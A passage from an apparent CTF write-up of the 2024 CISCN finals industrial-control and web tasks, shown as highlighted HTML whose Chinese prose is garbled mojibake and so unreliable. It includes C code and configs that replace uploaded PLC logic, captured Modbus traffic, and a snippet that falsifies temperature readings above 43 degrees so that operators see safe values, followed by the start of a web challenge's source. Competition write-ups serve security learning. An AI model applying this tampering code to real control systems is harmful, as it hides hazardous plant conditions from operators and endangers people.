number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fdst<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//æ–‡ä»¶æ›¿æ¢ä»£ç ç»“æŸ</span>        <span class="token function">ex_module_sendmsg</span><span class="token punctuation">(</span>sub_proc<span class="token punctuation">,</span>recv_msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ˜¯æ’°å†™è·¯ç”±è§„åˆ™ã€‚pluginé‡Œé¢åªéœ€è¦æŠŠæ¨¡å—åŠ è¿›å»å³å¯ã€‚è·¯ç”±è§„åˆ™çš„è¯ï¼Œç›´æ¥è·‘ä¸€éè„šæœ¬ç„¶åçœ‹æ—¥å¿—ï¼Œå†³å®šåœ¨å“ªé‡Œæåˆ‡é¢ã€‚</p><p>instance&#x2F;engineer&#x2F;station&#x2F;plugin_config.cfg.task_2_2</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_send"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgfile_send"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_print"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgrecord_print"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"init_para"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token property">"mode"</span><span class="token operator">:</span><span class="token number">1</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>instance&#x2F;engineer&#x2F;station&#x2F;aspect_policy.cfg.task_2_2</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"policy_head"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>                <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>                <span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                <span class="token property">"rjump"</span><span class="token operator">:</span><span class="token number">-2</span><span class="token punctuation">,</span>                <span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"challenge_login"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                        <span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIN"</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"CONN"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"center_client"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">]</span>                <span class="token property">"response_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">&#125;</span>                <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"policy_head"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"bin_upload"</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>                <span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                <span class="token property">"rjump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                <span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"filereplace"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                        <span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">&#125;</span>                <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·‘éªŒè¯è„šæœ¬çœ‹çœ‹</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120528156.png" alt="image-20240713120528156"></p><p>ä¸Šä¼ é€»è¾‘æ²¡é—®é¢˜</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120803696.png" alt="image-20240713120803696"></p><p>æ¸©åº¦ä¸Šå‡ï¼Œæ”»å‡»æˆåŠŸ</p><hr><h3 id="modbusæ•°æ®ç›‘å¬ä¸ç¯¡æ”¹"><a href="#modbusæ•°æ®ç›‘å¬ä¸ç¯¡æ”¹" class="headerlink" title="modbusæ•°æ®ç›‘å¬ä¸ç¯¡æ”¹"></a>modbusæ•°æ®ç›‘å¬ä¸ç¯¡æ”¹</h3><p>æœ¬ä»»åŠ¡æ¼”ç¤ºå¯¹modbusåè®®æ•°æ®çš„æ”»å‡»è¡Œä¸ºï¼Œé€‰æ‰‹éœ€è¦å¯¹modbusåè®®æœ‰åŸºç¡€çš„äº†è§£ã€‚</p><blockquote><p>åœ¨modbus_hackerå®ä¾‹ä¸­ï¼Œmodbus_monitoræ¨¡å—æ¥å…¥åˆ°modbusä¸»è®¾å¤‡å’Œä»è®¾å¤‡çš„é€šä¿¡çº¿è·¯ä¸­ï¼Œå‡†å¤‡çªƒå¬å½“å‰æ¸©åº¦ã€‚çªƒå¬æ¸©åº¦åä¸å¿…è¾“å‡ºï¼Œå½“æ¸©åº¦è¶…è¿‡43åº¦æ—¶ï¼Œæ¨¡å—åº”ç¯¡æ”¹å›ä¼ çš„æ¸©åº¦æ•°å€¼ï¼Œä½¿æ“ä½œå‘˜å’Œç›‘è§†å‘˜çœ‹åˆ°çš„æ¸©åº¦å§‹ç»ˆä½äº43åº¦ã€‚</p></blockquote><p>å¯ä»¥ç”¨operator_start.shè„šæœ¬è§‚å¯Ÿmodbusåè®®çš„è¾“å…¥è¾“å‡ºï¼Œmodbus_hackerå®ä¾‹çš„<code>modbus_monitor</code>æ¨¡å—ä¼šæ‰“å°åè®®çš„è¾“å…¥è¾“å‡ºä¿¡æ¯ã€‚æ³¨æ„åç»­å®éªŒæ—¶ï¼Œä¸ºæµ‹è¯•è®¿æ§å’ŒåŠ å¯†æ•ˆæœï¼Œmodbus_monitoræ¨¡å—å»ºè®®æ”¹å›åŸç‰ˆæ¨¡å—ã€‚</p><br><p>æœ¬é¢˜éœ€è¦ä¿®æ”¹ä¸€ä¸ªæºç æ–‡ä»¶<code>modbus_monitor.c</code> ï¼šæ‰§è¡Œmodbusåè®®æ•°æ®çªƒå¬modbusåè®®æ¸©åº¦æ•°å€¼å¹¶è¿›è¡Œç¯¡æ”¹æ”»å‡»</p><p>æ ¸å¿ƒæ•ˆæœï¼Œå°±æ˜¯å½“æ¸©åº¦é«˜äº43åº¦çš„æ—¶å€™ï¼Œå°†æ•°æ®ç¯¡æ”¹ä¸ºä½äº43åº¦ï¼Œä»¥å®ç°å¯¹æ¸©åº¦ç›‘æ§çš„ç ´å</p><p>åœ¨æœ¬åœ°è¿è¡Œ<code>operator_start.sh</code>ï¼Œè·å¾—ä¸€ç»„ç”¨äºåˆ†æçš„æ•°æ®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>01 00 00 00 00 06 01 05 02 00 00 ff  get modbus data <span class="token number">12</span> bytes from server<span class="token operator">!</span>01 00 00 00 00 06 01 05 02 00 00 ff <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"ON"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_S"</span>,<span class="token string">"value"</span>:65280,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>02 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>02 00 00 00 00 05 01 04 02 8c <span class="token number">10</span> <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:423<span class="token number">6</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>03 00 00 00 00 06 01 06 <span class="token number">43</span> 9c 3c 0f  get modbus data <span class="token number">12</span> bytes from server<span class="token operator">!</span>03 00 00 00 00 06 01 06 <span class="token number">43</span> 9c 3c 0f <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"ADJUST"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"set_T"</span>,<span class="token string">"value"</span>:3900,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> target T is <span class="token number">3900</span><span class="token operator">!</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>04 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>04 00 00 00 00 05 01 04 02 9d <span class="token number">13</span> <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:502<span class="token number">1</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>05 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>05 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>06 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>06 00 00 00 00 05 01 04 02 <span class="token number">12</span> 1c <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:718<span class="token number">6</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>07 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>07 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>08 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>08 00 00 00 00 05 01 04 02 b3 1e <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:785<span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>09 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>09 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>0a 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>0a 00 00 00 00 05 01 04 02 c2 1f <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:813<span class="token number">0</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>0b 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>0b 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ä¸Šæ–‡çš„æ¯”å¯¹ï¼Œå¯ä»¥å¾—åˆ°æ¸©åº¦æ•°æ®<code>curr_T</code>åº”è¯¥ç”±<code>serverç«¯</code>å¾—åˆ°ï¼Œæ”¹å˜çš„ä¸º<code>Buf[9]</code>å’Œ<code>Buf[10]</code>ä¸¤ä¸ªéƒ¨åˆ†</p><table><thead><tr><th>modbus data from server</th><th>Buf[9], Buf[10]</th><th>curr_T value</th></tr></thead><tbody><tr><td>02 00 00 00 00 05 01 04 02 8c 10</td><td>8c 10</td><td>4236</td></tr><tr><td>04 00 00 00 00 05 01 04 02 9d 13</td><td>9d 13</td><td>5021</td></tr><tr><td>06 00 00 00 00 05 01 04 02 12 1c</td><td>12 1c</td><td>7186</td></tr><tr><td>08 00 00 00 00 05 01 04 02 b3 1e</td><td>b3 1e</td><td>7859</td></tr><tr><td>0a 00 00 00 00 05 01 04 02 c2 1f</td><td>c2 20</td><td>8130</td></tr></tbody></table><p>è§‚å¯Ÿå‘ç°æ˜¯å°ç«¯å­˜å‚¨ï¼Œå†™ä¸€ä¸ªæ£€æµ‹</p><p>src&#x2F;security&#x2F;modbus_monitor&#x2F;modbus_monitor.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// çªƒå–æ•°æ®å’Œç¯¡æ”¹æ•°æ®çš„ä½ç½®å¼€å§‹</span>                     <span class="token keyword">if</span><span class="token punctuation">(</span>Buf<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">int</span> temperature <span class="token operator">=</span> <span class="token punctuation">(</span>Buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> Buf<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>temperature <span class="token operator">>=</span> <span class="token number">4300</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                 Buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>                 Buf<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x68</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span> <span class="token comment">//çªƒå–æ•°æ®å’Œç¯¡æ”¹æ•°æ®çš„ä½ç½®ç»“æŸ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‡æ–°ç¼–è¯‘ï¼Œç„¶åæ‰§è¡ŒéªŒè¯è„šæœ¬</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713165910986.png" alt="image-20240713165910986"></p><p>æ¸©åº¦ç¨³å®šæ˜¾ç¤ºåœ¨4200</p><hr><h2 id="è®¿é—®æ§åˆ¶æ¨¡æ‹Ÿä»»åŠ¡"><a href="#è®¿é—®æ§åˆ¶æ¨¡æ‹Ÿä»»åŠ¡" class="headerlink" title="è®¿é—®æ§åˆ¶æ¨¡æ‹Ÿä»»åŠ¡"></a>è®¿é—®æ§åˆ¶æ¨¡æ‹Ÿä»»åŠ¡</h2><p>åé¢ä¸¤é¢˜äº¤ç»™é˜Ÿå‹äº†ï¼Œæˆ‘å¼€æ‘†ï¼ˆ</p><h3 id="è§’è‰²éªŒè¯"><a href="#è§’è‰²éªŒè¯" class="headerlink" title="è§’è‰²éªŒè¯"></a>è§’è‰²éªŒè¯</h3><hr><h3 id="è§’è‰²æƒé™é™åˆ¶"><a href="#è§’è‰²æƒé™é™åˆ¶" class="headerlink" title="è§’è‰²æƒé™é™åˆ¶"></a>è§’è‰²æƒé™é™åˆ¶</h3><hr><h2 id="å¯†ç ä¿æŠ¤æ¨¡æ‹Ÿä»»åŠ¡"><a href="#å¯†ç ä¿æŠ¤æ¨¡æ‹Ÿä»»åŠ¡" class="headerlink" title="å¯†ç ä¿æŠ¤æ¨¡æ‹Ÿä»»åŠ¡"></a>å¯†ç ä¿æŠ¤æ¨¡æ‹Ÿä»»åŠ¡</h2><hr><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>day1å¯ä¿¡è®¡ç®—</p><p>day2è½¦è”ç½‘+å·¥æ§</p><p>å› ä¸ºéƒ½æ²¡æ¥è§¦è¿‡æ‰€ä»¥è¿™éƒ¨åˆ†å…¨äº¤ç»™é˜Ÿå‹ä»¬æ¥åš</p><hr><h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>è¢«å®šå¼æ€ç»´å®³äº†ï¼Œç¬¬6è½®å¼€å§‹æˆ‘æ‰ä¿®å¥½jsï¼ŒæŒ‰ç†æ¥è¯´15æ¬¡æäº¤æœºä¼šä¸Šæ¥å°±åº”è¯¥wafæ‹‰æ»¡èµŒä¸€èµŒçš„</p><p>@chené‚£è¾¹ä¹Ÿæ˜¯ä¿®äºŒæ‰“ä¸€ï¼ŒçœŸå‰å®³ï¼ˆå·è…”</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720150051765.png" alt="image-20240720150051765"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><h3 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h3><p>breaké—æ†¾å››è¡€</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> ejs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParse <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">createDirectoriesForFilePath</span><span class="token punctuation">(</span><span class="token parameter">filePath</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> dirname <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>    fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>dirname<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">recursive</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">IfLogin</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> storage <span class="token operator">=</span> multer<span class="token 